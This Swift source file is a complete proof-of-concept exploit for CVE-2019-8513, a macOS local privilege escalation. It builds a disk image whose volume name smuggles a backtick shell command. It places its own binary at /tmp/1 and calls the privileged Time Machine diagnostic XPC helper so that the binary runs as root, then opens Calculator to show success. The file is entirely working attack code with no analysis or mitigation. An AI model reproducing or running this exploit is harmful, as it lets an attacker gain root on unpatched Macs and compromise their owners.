//
//  main.swift
//  cve-2019-8513
//
//  Created by gk on 2019/4/28.
//  Copyright Â© 2019 gk. All rights reserved.
//

import Foundation

@objc protocol DETimeMachineHelperProtocol {
    
    func runDiagnosticWithDestinationDir(_: NSURL, replyURL: @escaping (_: NSURL)->Void)
}

func exploit() {
    
    let path = NSTemporaryDirectory() + ProcessInfo.processInfo.globallyUniqueString
    
    try? FileManager.default.createDirectory(at: URL(fileURLWithPath: path), withIntermediateDirectories: true, attributes: nil)
    
    var task = Process()
    task.launchPath = "/usr/bin/hdiutil"
    task.arguments = ["create", "-fs", "HFS+", "-volname", "disk`t*/1`\nA", "-srcfolder", path, "-size", "840k", "-format", "UDRW", path + ".dmg"]
    task.standardOutput = nil
    task.standardError = nil
    task.launch()
    task.waitUntilExit()
    
    task = Process()
    task.launchPath = "/usr/bin/hdiutil"
    task.arguments = ["attach", path + ".dmg"]
    task.standardOutput = nil
    task.standardError = nil
    task.launch()
    task.waitUntilExit()
    
    try? FileManager.default.removeItem(atPath: "/tmp/1")
    try? FileManager.default.copyItem(atPath: Bundle.main.executablePath!, toPath: "/tmp/1")
    
    let xpcConnect = NSXPCConnection(machServiceName: "com.apple.diagnosticextensions.osx.timemachine.helper", options: .privileged)
    
    xpcConnect.remoteObjectInterface = NSXPCInterface(with: DETimeMachineHelperProtocol.self)
    
    xpcConnect.resume()
    
    let sema = DispatchSemaphore(value: 0)
    
    (xpcConnect.remoteObjectProxy as! DETimeMachineHelperProtocol).runDiagnosticWithDestinationDir(NSURL(fileURLWithPath: path)) { (_: NSURL) in
        
        print("done")
        sema.signal()
    }
    
    sema.wait()
}

if geteuid() != 0 {
    
    exploit()
} else {
    
    let task = Process()
    task.launchPath = "/Applications/Calculator.app/Contents/MacOS/Calculator"
    task.arguments = []
    task.launch()
    task.waitUntilExit()
}

